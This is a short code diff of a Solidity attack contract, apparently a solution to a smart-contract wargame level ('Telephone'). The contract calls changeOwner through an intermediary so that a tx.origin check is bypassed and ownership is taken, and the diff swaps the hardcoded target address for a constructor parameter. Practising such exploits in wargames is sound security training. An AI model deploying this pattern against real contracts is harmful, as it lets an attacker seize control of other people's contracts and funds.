@@ -11,13 +11,14 @@ interface ITelephone {
 }
 
 // Simply use a contract to call the changeOwner function and bypass the tx.origin check
-contract OneMissedCall {
-    address constant telephoneContract =
-        0x78511757104F75fE89E6F291cB86f553ff3b4207; // Replace with your CoinFlip instance
+contract MissedCall {
+    address immutable telephone;
+
+    constructor(address _telephone) {
+        telephone = _telephone;
+    }
 
     function attack() public {
-        ITelephone(telephoneContract).changeOwner(msg.sender);
+        ITelephone(telephone).changeOwner(msg.sender);
     }
 }
-
-// 🎉 Level completed! 🎉
